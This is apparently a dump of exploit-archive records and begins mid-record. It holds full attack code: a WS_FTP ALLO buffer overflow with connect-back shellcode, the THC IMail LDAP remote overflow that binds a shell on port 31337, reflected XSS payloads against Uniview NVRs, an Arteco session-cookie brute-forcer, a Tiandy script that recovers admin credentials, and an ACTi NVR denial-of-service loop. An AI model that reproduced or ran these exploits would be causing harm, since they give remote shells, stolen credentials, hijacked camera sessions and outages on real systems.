int len = read_serv_mem(addr+i, (char*)dst+i, dstlen-i);
if (len <= 0)
return len;
i += len;
return dstlen;
int xuser::read_serv_mem_string(unsigned addr, char* dst, int dstlen)
int len = read_serv_mem(addr, dst, dstlen);
if (len <= 0)
return len;
if (dst[len-1] != 0)
return -1;
return len;
int xuser::read_serv_mem_uint32(unsigned addr, unsigned* dst)
unsigned char tmp[4];
int ret = read_serv_mem_bytes(addr, tmp, sizeof(tmp));
if (ret <= 0)
return ret;
if (ret != sizeof(tmp))
return -1;
*dst = (tmp[3] << 24) | (tmp[2] << 16) | (tmp[1] << 8) | tmp[0];
return ret;
int xuser::exploit(unsigned long sip, unsigned short sport)
int ret = 0;
char* shellcode = NULL;
char* badbuf = NULL;
__try
* Encrypt the shellcode
const shellcode_len = sizeof(shlc2_code)-1;
shellcode = new char[shellcode_len+1];
memcpy(shellcode, shlc2_code, shellcode_len);
shellcode[shellcode_len] = 0;
shellcode[2] = (char)2;
shellcode[3] = (char)(2 >> 8);
shellcode[4] = (char)(sport >> 8);
shellcode[5] = (char)sport;
shellcode[6] = (char)(sip >> 24);
shellcode[7] = (char)(sip >> 16);
shellcode[8] = (char)(sip >> 8);
shellcode[9] = (char)sip;
for (int i = 0; i < 8; i++)
if (!enc_byte(shellcode[2+i], shellcode[2+8+i], is_valid_shlc2))
__leave;
for (int i = 0; i < 4; i++)
int k = get_enc_key(&shellcode[shlc2_offs_encstart], shlc2_offs_encend-shlc2_offs_encstart, i, 4, is_valid_shlc2);
if (k < 0)
__leave;
shellcode[shlc2_offs_enckey+i] = k;
msg(""[+] Shellcode encryption key = %02X%02X%02X%02X\n"",
(unsigned char)shellcode[shlc2_offs_enckey+3],
(unsigned char)shellcode[shlc2_offs_enckey+2],
(unsigned char)shellcode[shlc2_offs_enckey+1],
(unsigned char)shellcode[shlc2_offs_enckey]);
for (int i = 0; i < shlc2_offs_encend-shlc2_offs_encstart; i++)
shellcode[shlc2_offs_encstart+i] ^= shellcode[shlc2_offs_enckey + i % 4];
* Do some sanity checks
if (!check_invd_bytes(""shellcode"", shellcode, shellcode_len, is_valid_shlc2) ||
!check_invd_bytes(""ret_addr"", ret_addr, 4, is_valid_shlc2))
__leave;
if (!delete_file(s, temp_file))
msg(""Could not delete file\n"");
__leave;
unsigned tot_size;
if (!get_user_total_file_size(s, tot_size))
__leave;
msg(""[+] Scanning server memory: "");
quite_you = 1;
const unsigned ADDR_START = SERV_STK_SIZE;
const unsigned ADDR_END = MAX_ADDR-1;
unsigned this_ptr;
for (unsigned addr = ADDR_START; ; addr += SERV_STK_SIZE)
if (addr > ADDR_END || !addr)
* Can happen if the address of the thread's stack is not in the same position in
* memory. This most likely happens when another user logged in or it sent a FTP
* command which creates a new server thread. Try again.
msg2(""[-] Could not find the this ptr. Try again.\n"");
__leave;
int rc = read_serv_mem_uint32(addr + SERV_STK_OFFS + SERV_STK_THIS_OFFS, &this_ptr);
if (rc < 0)
msg2(""- unknown error\n""); // Error
__leave;
else if (rc == 0)
msg2(""x""); // Crashed
else
msg2("".""); // Bingo
char tmp[0x200];
if (this_ptr + SERV_THIS_USERNAME_OFFS < MAX_ADDR && this_ptr + SERV_THIS_CMDBUF_OFFS < MAX_ADDR &&
read_serv_mem_string(this_ptr + SERV_THIS_USERNAME_OFFS, tmp, sizeof(tmp)) > 0 &&
!strcmp(tmp, username) &&
read_serv_mem_string(this_ptr + SERV_THIS_CMDBUF_OFFS, tmp, sizeof(tmp)) > 0 &&
!strcmp(tmp, ALLO_STRING))
break;
quite_you = 0;
msg(""\n[+] this = %08X\n"", this_ptr);
const char* s1 = ""quota exceeded; "";
char padding[SERV_BUF_EIP];
int padding_len = sizeof(padding) - (int)strlen(s1);
memset(padding, 'A', sizeof(padding));
int xpsz = (int)strlen(ALLO_STRING ""\r\n"") + padding_len + 4 + shellcode_len;
badbuf = new char[xpsz+1];
badbuf[xpsz] = 0;
int tmpidx = 0;
if (!add_bytes(badbuf, tmpidx, xpsz, ALLO_STRING ""\r\n"", (int)strlen(ALLO_STRING ""\r\n"")) ||
!add_bytes(badbuf, tmpidx, xpsz, padding, padding_len) ||
!add_bytes(badbuf, tmpidx, xpsz, ret_addr, 4) ||
!add_bytes(badbuf, tmpidx, xpsz, shellcode, shellcode_len) ||
tmpidx != xpsz)
msg(""[-] This is a bug. Now you know\n"");
__leave;
if (!create_file_for_addr(s, this_ptr + SERV_THIS_CMDBUF_OFFS + strlen(ALLO_STRING ""\r\n"")))
__leave;
if (send_cmd2(s, badbuf) < 0)
__leave;
ret = 1;
__finally
quite_you = 0;
if (shellcode)
delete shellcode;
if (badbuf)
delete badbuf;
return ret;
void show_help(char* pname)
msg(""%s <ip> <port> <sip> <sport> [-u username] [-p userpass] [-a]\n"", pname);
exit(1);
int main(int argc, char** argv)
msg(""Ipswitch WS_FTP Server <= 4.0.2 ALLO exploit\n"");
msg(""(c)2004 Hugh Mann hughmann@hotmail.com\n"");
WSADATA wsa;
if (WSAStartup(0x0202, &wsa))
return 1;
if (argc < 5)
show_help(argv[0]);
unsigned long ip = ntohl(inet_addr(argv[1]));
unsigned short port = (unsigned short)atoi(argv[2]);
unsigned long sip = ntohl(inet_addr(argv[3]));
unsigned short sport = (unsigned short)atoi(argv[4]);
const char* username = ""anonymous"";
const char* userpass = ""Hugh Mann"";
for (int i = 5; i < argc; i++)
if (!strcmp(argv[i], ""-u"") && i + 1 < argc)
username = argv[++i];
else if (!strcmp(argv[i], ""-p"") && i + 1 < argc)
userpass = argv[++i];
else if (!strcmp(argv[i], ""-a""))
output_all = 1;
else
show_help(argv[0]);
if (!ip || !port || !sip || !sport)
show_help(argv[0]);
xuser user;
if (!user.init(ip, port, username, userpass))
return 0;
if (!user.exploit(sip, sport))
msg(""[-] u n33d t0 s7uddy m0r3...\n"");
else
msg(""[+] Wait a few secs for a shell\n"");
return 0;"
2004-02-27,Remote,Windows,Johnny Cyberpunk,IPSwitch IMail LDAP Daemon/Service,Remote Buffer Overflow,"/* THCimail 0.1 - Wind0wZ remote root exploit                                */
/* Exploit by: Johnny Cyberpunk (jcyberpunk@thc.org)                     */
/* THC PUBLIC SOURCE MATERIALS                                               */
/*                                                                                              */
/* Bug was found by idefense or some idefense slaves ;)                 */
/* http://www.idefense.com/application/poi/display?id=74&type=vuln */
/*                                                                                              */
/* compile with MS Visual C++ : cl THCimail.c                                  */
/*                                                                                              */
/* At least some greetz fly to : THC, Halvar Flake, FX, gera, MaXX,    */
/* dvorak, scut, stealth, FtR and Random                                       */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, ""ws2_32.lib"")
#define jumper ""\xeb\x06\x4a\x43""
// milw0rm.com [2004-02-27]","char *WIN2KEN = ""\xc4\x2a\x02\x75"";
char *WIN2KPG = ""\xc4\x2a\xf9\x74"";
char *WINXPSP1G = ""\xfe\x63\xa1\x71"";
char ldapshit[] = ""\x30\x82\x0a\x3d\x02\x01\x01\x60\x82\x01\x36\x02\xff\xff\xff\xff\x20"";
char shellcode[] =
""\x8b\x7c\x24\xfc\x83\xc7\x21\x33\xc9\xb2\x8f\x66\x81\xc1\x02""
""\x02\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\x64\xac\xf5\xe6\x8d""
""\x8a\xe3\xd6\x77\x92\x13\x51\x03\x5e\xc3\xff\x5b\x8c\x7f\xa8""
""\xaf\xaf\xbf\x87\xd8\xdc\xbd\xd0\xbc\xbd\xa1\xcb\xc3\xc3\x8e""
""\x64\x8a\x67\x76\x70\x70\x70\xd2\x0c\x62\xa5\xe5\xbf\xd6\xeb""
""\x04\x8e\x04\xcf\x83\x04\xff\x93\x22\x04\xf7\x87\x02\xd0\xb3""
""\x04\x94\x8e\x74\x04\xd4\xf7\x8e\x74\x04\xc4\x93\x8e\x76\x04""
""\xdc\xab\x8e\x75\xdc\xde\xdd\x04\xd4\xaf\x8e\x74\xbe\x46\xce""
""\xbe\x4f\x16\x04\xbb\x04\x8e\x71\x23\xbe\x4d\x5e\x6d\x0b\x4f""
""\xfa\x78\x80\x39\xca\x8a\x02\xcb\xca\x8b\xe9\xb6\x9f\xfa\x6e""
""\xe9\xbe\x9f\xd5\xd7\xd1\xd9\xdf\xdd\xa4\xc1\x9f\xce\x80\x38""
""\x83\xc5\x04\x8b\x07\x8e\x77\x80\x39\xc2\x8a\x06\xcb\x02\x57""
""\x71\xc2\x8a\xfa\x31\x71\xc2\x8b\xfb\xae\x71\xc2\xad\x02\xd2""
""\x97\xdc\x70\x5f\x06\x48\xe5\x8b\xd7\x07\xca\x8a\x0f\xca\xf8""
""\x85\x02\xd2\xfb\x0f\xe4\xa9\x9b\x66\xf7\x70\x70\x70\x06\x41""
""\xbe\x54\xdc\xdc\xdc\xdc\xd9\xc9\xd9\x70\x5f\x18\xda\xd7\xe9""
""\x06\xbf\xe5\x9f\xda\xd8\x70\xda\x5b\xc1\xd9\xd8\x70\xda\x43""
""\xdc\xda\xd8\x70\xda\x5f\x18\x02\xca\x07\xdf\x70\xda\x6b\xda""
""\xda\x70\xda\x67\x02\xcb\x8a\x83\x1b\xdc\xe7\xa1\xea\xf7\xea""
""\xe7\xd3\xec\xe2\xeb\x1b\xbe\x5d\x02\xca\x43\x1b\xd8\xd8\xd8""
""\xdc\xdc\x71\x49\x8e\x7d\xdd\x1b\x02\xca\xf7\xdf\x02\xca\x07""
""\xdf\x3e\x87\xdc\xdc\xe5\x9f\x71\x41\xdd\xdc\xdc\xdc\xda\x70""
""\xda\x63\xe5\x70\x70\xda\x6f"";
void usage();
void shell(int sock);
int main(int argc, char *argv[])
unsigned int i,sock,sock2,addr,os,ver,rc,IMAILVER;
unsigned char *finalbuffer,*crapbuf1,*crapbuf2;
unsigned int IMAIL6_7=60;
unsigned int IMAIL_8=68;
struct sockaddr_in mytcp;
struct hostent * hp;
WSADATA wsaData;
printf(""\nTHCimail v0.1 - Imail LDAP exploit\n"");
printf(""tested on Imail 6-8\n"");
printf(""by Johnny Cyberpunk (jcyberpunk@thc.org)\n"");
if(argc<4 || argc>4)
usage();
ver = (unsigned short)atoi(argv[3]);
switch(ver)
case 0:
IMAILVER = IMAIL6_7;
break;
case 1:
IMAILVER = IMAIL_8;
break;
default:
printf(""\nYou entered an illegal version !\n\n"");
usage();
exit(-1);
crapbuf1 = malloc(IMAILVER);
memset(crapbuf1,'X',IMAILVER);
printf(""imailver = %d\n"",IMAILVER);
crapbuf2 = malloc(2220);
memset(crapbuf2,'X',2220);
finalbuffer = malloc(2650);
memset(finalbuffer,0,2650);
printf(""\n[*] building buffer\n"");
strcat(finalbuffer,ldapshit);
strcat(finalbuffer,crapbuf1);
strcat(finalbuffer,jumper);
os = (unsigned short)atoi(argv[2]);
switch(os)
case 0:
strcat(finalbuffer,WIN2KPG);
break;
case 1:
strcat(finalbuffer,WIN2KPG);
break;
case 2:
strcat(finalbuffer,WINXPSP1G);
break;
default:
printf(""\nYou entered an illegal OS !\n\n"");
usage();
exit(-1);
strcat(finalbuffer,shellcode);
strcat(finalbuffer,crapbuf2);
if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0)
printf(""WSAStartup failed !\n"");
exit(-1);
hp = gethostbyname(argv[1]);
if (!hp){
addr = inet_addr(argv[1]);
if ((!hp) && (addr == INADDR_NONE) )
printf(""Unable to resolve %s\n"",argv[1]);
exit(-1);
sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
printf(""socket() error...\n"");
exit(-1);
if (hp != NULL)
memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);
else
mytcp.sin_addr.s_addr = addr;
if (hp)
mytcp.sin_family = hp->h_addrtype;
else
mytcp.sin_family = AF_INET;
mytcp.sin_port=htons(389);
printf(""[*] connecting the target\n"");
rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));
if(rc==0)
send(sock,finalbuffer,2650,0);
printf(""[*] Exploit send successfully ! Sleeping a while ....\n"");
Sleep(1000);
else
printf(""\nCan't connect to ldap port!\n"");
if(rc==0)
printf(""[*] Trying to get a shell\n\n"");
sock2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
mytcp.sin_port = htons(31337);
rc = connect(sock2, (struct sockaddr *)&mytcp, sizeof(mytcp));
if(rc!=0)
printf(""can't connect to port 31337 ;( maybe firewalled ...\n"");
exit(-1);
shell(sock2);
shutdown(sock,1);
closesocket(sock);
free(crapbuf1);
free(crapbuf2);
free(finalbuffer);
exit(0);
void usage()
unsigned int a;
printf(""\nUsage: <Host> <OS> <Imail Version>\n"");
printf(""Sample: THCimail 194.44.55.56 0 1\n\n"");
printf(""OS:\n"");
printf(""0 - Windows 2000 Server english all service packs\n"");
printf(""1 - Windows 2000 Professional german\n"");
printf(""2 - Windows XP SP1 german\n\n"");
printf(""Imail Version:\n"");
printf(""0 - Imail 6+7\n"");
printf(""1 - Imail 8\n"");
exit(0);
void shell(int sock)
int l;
char buf[1024];
struct timeval time;
unsigned long ul[2];
time.tv_sec = 1;
time.tv_usec = 0;
while (1)
ul[0] = 1;
ul[1] = sock;
l = select (0, (fd_set *)&ul, NULL, NULL, &time);
if(l == 1)
l = recv (sock, buf, sizeof (buf), 0);
if (l <= 0)
printf (""bye bye...\n"");
return;
l = write (1, buf, l);
if (l <= 0)
printf (""bye bye...\n"");
return;
else
l = read (0, buf, sizeof (buf));
if (l <= 0)
printf(""bye bye...\n"");
return;
l = send(sock, buf, l, 0);
if (l <= 0)
printf(""bye bye...\n"");
return;"
2023-03-29,WebApps,Hardware,Bleron Rrustemi,Uniview NVR301-04S2-P4,Reflected Cross-Site Scripting (XSS),"# Exploit Title: Uniview NVR301-04S2-P4 - Reflected Cross-Site Scripting (XSS)
# Author: Bleron Rrustemi
# Discovery Date: 2022-11-15
# Vendor Homepage: https://www.uniview.com/tr/Products/NVR/Easy/NVR301-04S2-P4/
# Datasheet:: https://www.uniview.com/download.do?id=1761643
# Device Firmware: NVR-B3801.20.15.200829
# Tested Version: NVR301-04S2-P4
# Tested on: Windows 10 Enterprise LTSC 64\Firefox 106.0.5 (64-bit)
# Vulnerability Type: Reflected Cross-Site Scripting (XSS)
# CVE: N/A
# Proof of Concept:
http://IP/LAPI/V1.0/System/Security/Login/""><script>alert('1')</script>
www.drugeza.com","IP=IP of the device
Best regards,
Bleron Rrustemi
Chief Technology Officer
Direct: +383 (0) 49 955 503
E-mail:  <mailto:bleron@drugeza.com> bleron@drugeza.com
<http://>
Drugëza SHPK
Rr. Lekë Dukagjini p.n
Prishtinë, 10000 • Kosovo
​Tel.: +383 49 955 503
​
ü Be GREEN, keep it on the SCREEN"
2022-02-16,WebApps,Hardware,Luis Martínez,Network Video Recorder NVR304-16EP,Reflected Cross-Site Scripting (XSS) (Unauthenticated),"# Exploit Title: Network Video Recorder NVR304-16EP - Reflected Cross-Site Scripting (XSS) (Unauthenticated)
# Author: Luis Martinez
# Discovery Date: 2022-02-13
# Vendor Homepage: https://www.uniview.com/Products/NVR/Easy/NVR304-S-P/#~Product%20features
# Datasheet of NVR304-S-P: https://www.uniview.com/download.do?id=1819568
# Tested Version: NVR304-16EP
# Tested on: Windows 10 Pro 21H2 x64 es - Firefox 91.6.0esr
# Vulnerability Type: Reflected Cross-Site Scripting (XSS)
# CVE: N/A
# Proof of Concept:
http://IP/LAPI/V1.0/System/Security/Login/""><script>alert('XSS')</script>",
2021-01-04,WebApps,Windows,LiquidWorm,Arteco Web Client DVR/NVR,'SessionId' Brute Force,"# Exploit Title: Arteco Web Client DVR/NVR - 'SessionId' Brute Force
# Date: 16.11.2020
# Exploit Author: LiquidWorm
# Vendor Homepage: https://www.arteco-global.com
#!/usr/bin/env python3
# Arteco Web Client DVR/NVR 'SessionId' Cookie Brute Force Session Hijacking Exploit
# Vendor: Arteco S.U.R.L.
# Product web page: https://www.arteco-global.com
# Affected version: n/a
# Summary: Arteco DVR/NVR is a mountable industrial surveillance server
# ideal for those who need to manage IP video surveillance designed for
# medium to large installations that require high performance and reliability.
# Arteco can handle IP video sources from all major international manufacturers
# and is compatible with ONVIF and RTSP devices.
# Desc: The Session ID 'SessionId' is of an insufficient length and can be
# exploited by brute force, which may allow a remote attacker to obtain a
# valid session, bypass authentication and disclose the live camera stream.
# Tested on: Microsoft Windows 10 Enterprise
#            Apache/2.4.39 (Win64) OpenSSL/1.0.2s
#            Apache/2.2.29 (Win32) mod_fastcgi/2.4.6 mod_ssl/2.2.29 OpenSSL/1.0.1m
#            Arteco-Server
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2020-5613
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5613.php
# 16.11.2020
# Check the Set-Cookie on the target and determine the length (varies per model/version)
# Cookie: SessionId=15800 - range(10000,100000)
# Cookie: SessionId=8350 - range(1000,10000)
# Cookie: SessionId=502 - range(100,1000)","import sys,requests
class BrutusCookius:
def __init__(self):
self.validate=None
self.cookies=None#
self.params=None##
self.stream=None##
self.path=None####
self.cgi=None#####
self.ip=None######
self.op=None######
def check(self):
print('Usage: ./arteco.py IP')
exit(9)
def bro(self):
if len(sys.argv) !=2:
self.check()
else:
self.ip=sys.argv[1]
print('[+] Target IP: '+self.ip)
if not 'http' in self.ip:
self.ip='http://{}'.format(self.ip)
def force(self):
self.op = range(17129,17149) # Tweak
for j in self.op:
session=requests.session()
self.cookies=dict(SessionId=str(j))
sys.stdout.write('[+] Trying ID: '+str(j))
self.path='/arteco-mobile/'
self.cgi='camera.fcgi'
self.params='?serverId=1&camera=2&mode=1&szx=5&szy=5&qty=15&fps=1'
self.validate=session.get(self.ip+self.path+self.cgi+self.params, cookies=self.cookies).headers
if not 'artecomobile' in str(self.validate):
print(' - NOPE.')
else:
print(' - BINGO!!!')
print('[+] Active session found: '+str(j))
print('[+] Use the cookie: SessionId='+str(j))
exit(9)
print('[!] Sorry, no valid session found.')
def main(self):
self.bro()
self.force()
if __name__ == '__main__':
BrutusCookius().main()"
2020-09-10,WebApps,Hardware,zb3,Tiandy IPC and NVR 9.12.7,Credential Disclosure,"# Exploit Title: Tiandy IPC and NVR 9.12.7 - Credential Disclosure
# Date: 2020-09-10
# Exploit Author: zb3
# Vendor Homepage: http://en.tiandy.com
# Product Link: http://en.tiandy.com/index.php?s=/home/product/index/category/products.html
# Software Link: http://en.tiandy.com/index.php?s=/home/article/lists/category/188.html
# Version: DVRS_V9.12.7, DVRS_V11.7.4, NVSS_V13.6.1, NVSS_V22.1.0
# Tested on: Linux
# CVE: N/A
# Requires Python 3 and PyCrypto
# For more details and information on how to escalate this further, see:
# https://github.com/zb3/tiandy-research
# psw not supported
### lib/des.py
### lib/binproto.py
### lib/crypt.py","import sys
import hashlib
import base64
import socket
import struct
from Crypto.Cipher import DES
def main():
if len(sys.argv) != 2:
print('python3 %s [host]' % sys.argv[0], file=sys.stderr)
exit(1)
host = sys.argv[1]
conn = Channel(host)
conn.connect()
crypt_key = conn.get_crypt_key(65536)
attempts = 2
tried_to_set_mail = False
ok = False
while attempts > 0:
attempts -= 1
code = get_psw_code(conn)
if code == False:
break
elif code == None:
if not tried_to_set_mail:
print(""No PSW data found, we'll try to set it..."", file=sys.stderr)
tried_to_set_mail = True
if try_set_mail(conn, 'a@a.a'):
code = get_psw_code(conn)
if code == None:
print(""couldn't set mail"", file=sys.stderr)
break
rcode, password = recover_with_code(conn, code, crypt_key)
if rcode == 5:
print('The device is locked, try again later.', file=sys.stderr)
break
if rcode == 0:
print('Admin', password)
ok = True
break
if tried_to_set_mail:
try_set_mail(conn, '')
if not code:
print(""PSW is not supported, trying default credentials..."", file=sys.stderr)
credentials = recover_with_default(conn, crypt_key)
if credentials:
user, pw = credentials
print(user, pw)
ok = True
if not ok:
print('Recovery failed', file=sys.stderr)
exit(1)
def try_set_mail(conn, target):
conn.send_msg(['PROXY', 'USER', 'RESERVEPHONE', '2', '1', target, 'FILETRANSPORT'])
resp = conn.recv_msg()
return resp[4:7] == ['RESERVEPHONE', '2', '1']
def get_psw_code(conn):
conn.send_msg(['IP', 'USER', 'LOGON', base64.b64encode(b'Admin').decode(), base64.b64encode(b'Admin').decode(), '', '65536', 'UTF-8', '0', '1'])
resp = conn.recv_msg()
if resp[4] != 'FINDPSW':
return False
psw_reg = psw_data = None
if len(resp) > 7:
psw_reg = resp[6]
psw_data = resp[7]
if not psw_data:
return None
psw_type = int(resp[5])
if psw_type not in (1, 2, 3):
raise Exception('unsupported psw type: '+str(psw_type))
if psw_type == 3:
psw_data = psw_data.split('""')[3]
if psw_type == 1:
psw_data = psw_data.split(':')[1]
psw_key = psw_reg[:0x1f]
elif psw_type in (2, 3):
psw_key = psw_reg[:4].lower()
psw_code = td_decrypt(psw_data.encode(), psw_key.encode())
code = hashlib.md5(psw_code).hexdigest()[24:]
return code
def recover_with_code(conn, code, crypt_key):
conn.send_msg(['IP', 'USER', 'SECURITYCODE', code, 'FILETRANSPORT'])
resp = conn.recv_msg()
rcode = int(resp[6])
if rcode == 0:
return rcode, decode(resp[8].encode(), crypt_key).decode()
return rcode, None
def recover_with_default(conn, crypt_key):
res = conn.login_with_key(b'Default', b'Default', crypt_key)
if not res:
return False
while True:
msg = conn.recv_msg()
if msg[1:5] == ['IP', 'INNER', 'SUPER', 'GETUSERINFO']:
return decode(msg[6].encode(), crypt_key).decode(), decode(msg[7].encode(), crypt_key).decode()
def reverse_bits(data):
return bytes([(b * 0x0202020202 & 0x010884422010) % 0x3ff for b in data])
def pad(data):
if len(data) % 8:
padlen = 8 - (len(data) % 8)
data = data + b'\x00' * (padlen-1) + bytes([padlen])
return data
def unpad(data):
padlen = data[-1]
if 0 < padlen <= 8 and data[-padlen:-1] == b'\x00'*(padlen-1):
data = data[:-padlen]
return data
def encrypt(data, key):
cipher = DES.new(reverse_bits(key), 1)
return reverse_bits(cipher.encrypt(reverse_bits(pad(data))))
def decrypt(data, key):
cipher = DES.new(reverse_bits(key), 1)
return unpad(reverse_bits(cipher.decrypt(reverse_bits(data))))
def encode(data, key):
return base64.b64encode(encrypt(data, key))
def decode(data, key):
return decrypt(base64.b64decode(data), key)
def recvall(s, l):
buf = b''
while len(buf) < l:
nbuf = s.recv(l - len(buf))
if not nbuf:
break
buf += nbuf
return buf
class Channel:
def __init__(self, ip, port=3001):
self.ip = ip
self.ip_bytes = socket.inet_aton(ip)[::-1]
self.port = port
self.msg_seq = 0
self.data_seq = 0
self.msg_queue = []
def fileno(self):
return self.socket.fileno()
def connect(self):
self.socket = socket.socket()
self.socket.connect((self.ip, self.port))
def reconnect(self):
self.socket.close()
self.connect()
def send_cmd(self, data):
self.socket.sendall(b'\xf1\xf5\xea\xf5' + struct.pack('<HH8xI', self.msg_seq, len(data) + 20, len(data)) + data)
self.msg_seq += 1
def send_data(self, stream_type, data):
self.socket.sendall(struct.pack('<4sI4sHHI', b'\xf1\xf5\xea\xf9', self.data_seq, self.ip_bytes, 0, len(data) + 20, stream_type) + data)
self.data_seq += 1
def recv(self):
hdr = recvall(self.socket, 20)
if hdr[:4] == b'\xf1\xf5\xea\xf9':
lsize, stream_type = struct.unpack('<14xHI', hdr)
data = recvall(self.socket, lsize - 20)
if data[:4] != b'NVS\x00':
print(data[:4], b'NVS\x00')
raise Exception('invalid data header')
return None, [stream_type, data[8:]]
elif hdr[:4] == b'\xf1\xf5\xea\xf5':
lsize, dsize = struct.unpack('<6xH10xH', hdr)
if lsize != dsize + 20:
raise Exception('size mismatch')
msgs = []
for msg in recvall(self.socket, dsize).decode().strip().split('\n\n\n'):
msg = msg.split('\t')
if '.' not in msg[0]:
msg = [self.ip] + msg
msgs.append(msg)
return msgs, None
else:
raise Exception('invalid packet magic: ' + hdr[:4].hex())
def recv_msg(self):
if len(self.msg_queue):
ret = self.msg_queue[0]
self.msg_queue = self.msg_queue[1:]
return ret
msgs, _ = self.recv()
if len(msgs) > 1:
self.msg_queue.extend(msgs[1:])
return msgs[0]
def send_msg(self, msg):
self.send_cmd((self.ip+'\t'+'\t'.join(msg)+'\n\n\n').encode())
def get_crypt_key(self, mode=1, uname=b'Admin', pw=b'Admin'):
self.send_msg(['IP', 'USER', 'LOGON', base64.b64encode(uname).decode(), base64.b64encode(pw).decode(), '', str(mode), 'UTF-8', '805306367', '1'])
resp = self.recv_msg()
if resp[4:6] != ['LOGONFAILED', '3']:
print(resp)
raise Exception('unrecognized login response')
crypt_key = base64.b64decode(resp[8])
return crypt_key
def login_with_key(self, uname, pw, crypt_key):
self.reconnect()
hashed_uname = base64.b64encode(hashlib.md5(uname.lower()+crypt_key).digest())
hashed_pw = base64.b64encode(hashlib.md5(pw+crypt_key).digest())
self.send_msg(['IP', 'USER', 'LOGON', hashed_uname.decode(), hashed_pw.decode(), '', '1', 'UTF-8', '1', '1'])
resp = self.recv_msg()
if resp[4] == 'LOGONFAILED':
return False
self.msg_queue = [resp] + self.msg_queue
return True
def login(self, uname, pw):
crypt_key = self.get_crypt_key(1, uname, pw)
if not self.login_with_key(uname, pw, crypt_key):
return False
return crypt_key
pat = b'abcdefghijklmnopqrstuvwxyz0123456789'
def td_asctonum(code):
if code in b'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
code += 0x20
if code not in pat:
return None
return pat.index(code)
def td_numtoasc(code):
if code < 36:
return pat[code]
return None
gword = [
b'SjiW8JO7mH65awR3B4kTZeU90N1szIMrF2PC',
b'04A1EF7rCH3fYl9UngKRcObJD6ve8W5jdTta',
b'brU5XqY02ZcA3ygE6lf74BIG9LF8PzOHmTaC',
b'2I1vF5NMYd0L68aQrp7gTwc4RP9kniJyfuCH',
b'136HjBIPWzXCY9VMQa7JRiT4kKv2FGS5s8Lt',
b'Hwrhs0Y1Ic3Eq25a6t8Z7TQXVMgdePuxCNzJ',
b'WAmkt3RCZM829P4g1hanBluw6eVGSf7E05oX',
b'dMxreKZ35tRQg8E02UNTaoI76wGSvVh9Wmc1',
b'i20mzKraY74A6qR9QM8H3ecUkBlpJC1nyFSZ',
b'XCAUP6H37toQWSgsNanf0j21VKu9T4EqyGd5',
b'dFZPb9B6z1TavMUmXQHk7x402oEhKJD58pyG',
b'rg8V3snTAX6xjuoCYf519BzWRtcMl2OiZNeI',
b'dZe620lr8JW4iFhNj3K1x59Una7PXsLGvSmB',
b'5yaQlGSArNzek6MXZ1BPOE3xV470h9KvgYmb',
b'f12CVxeQ56YWd7OTXDtlnPqugjJikELayvMs',
b'9Qoa5XkM6iIrR7u8tNZgSpbdDUWvwH21Kyzh',
b'AqGWke65Y2ufVgljEhMHJL01D8Zptvcw7CxX',
b't960P2inR8qEVmAUsDZIpH5wzSXJ43ob1kGW',
b'4l6SAi2KhveRHVN5JGcmx9jOC3afB7wF0ITq',
b'tEOp6Xo87QzPbn24J3i9FjWKS1lIBVaMZeHU',
b'zx27DH915lhs04aMJOgf6Z3pyERrGndiLwIe',
b'8XxOBzZ02hUWDQfvL471q9RC6sAaJVFuTMdG',
b'jON0i4C6Z3K97DkbqSypH8lRmx5o2eIwXas1',
b'OIGT0ubwH1x6hCvEgBn274A5Q8K9e3YyzWlm',
b'zgejY41CLwRNabovBUP2Aql7FVM8uEDXZQ0c',
b'Z2MpQE91gdRLYJ8bGIWyOfc4v03Hjzs6VlU5',
b't6PuvrBXeoHk5FJW08DYQSI49GCwZ27cA1UK',
b'FiBA53IMW97kYNz82GhHf1yUCdL0nlvRD46s',
b'2Vz3b06h54jmc7a8AIYtNHM1iQU9wBXWyJkR',
b'wyI42azocV3UOX6fk579hMH8eEGJsgFuBmqb',
b'TxmnK4ljJ9iroY8vVtg3Rae2L516fBWUuXAS',
b'z6Y1bPrJEln0uWeLKkjo9IZ2y7ROcFHqBm54',
b'x064LFB39TsXeryqvt2pZN8QIERuWAVUmwjJ',
b'76qg85yB31uH90YbZofsjKrRGiTVndAEtFMx',
b'WjwTEbCA752kq89shcaLB1xO64rgMYnoFiJQ',
b'u6307O4J2DeZs8UYyjlzfX91KGmavEdwTRSg'
def td_decrypt(data, key):
kdx = 0
ret = []
for idx, code in enumerate(data):
while True:
if kdx >= len(key):
kdx = 0
kcode = key[kdx]
knum = td_asctonum(kcode)
if knum is None:
kdx += 1
continue
break
if code not in gword[knum]:
return None
cpos = gword[knum].index(code)
ret.append(td_numtoasc(cpos))
kdx += 1
return bytes(ret)
if __name__ == '__main__':
main()"
2020-08-05,DoS,Windows,MegaMagnus,ACTi NVR3 Standard or Professional Server 3.0.12.42,Denial of Service (PoC),"# Exploit Title: ACTi NVR3 Standard or Professional Server 3.0.12.42 - Denial of Service (PoC)  #
# Date: 2020-08-04                                                              #
# Exploit Author: MegaMagnus                                                    #
# Vendor Homepage: https://www.acti.com/                                        #
# Software Link: https://www.acti.com/DownloadCenter                            #
# Version: V.3.0.12.42 , V.2.3.04.07                                            #
# Tested on: Windows 7, Windows 10                                              #
# CVE: CVE-2020-15956                                                           #
# This is a Proof of Concept Exploit, Please use responsibly.                   #
#!/usr/bin/env python","import requests
from requests.auth import HTTPBasicAuth
import sys
def product_info(server):
try:
r = requests.get(sys.argv[1] + '/media/Product/getProductInfo', timeout=10)
if r.status_code == 200:
print(r.text)
return True
except Exception as e:
print(e)
return False
if __name__ == ""__main__"":
if len(sys.argv) != 2:
print(""usage: cve-2020-15956.py <target>"")
exit(-1)
if product_info(sys.argv[1]):
print(""Starting DOS. Use Ctrl-C (SIGINT) to stop!"")
while True:
try:
payload = b""\x00"" * (760)
r = requests.get(sys.argv[1] + '/Media/UserGroup/login', auth=HTTPBasicAuth('Basic',payload), timeout=10)
print(r.status_code)
except KeyboardInterrupt:
pass
except Exception as e:
pass"
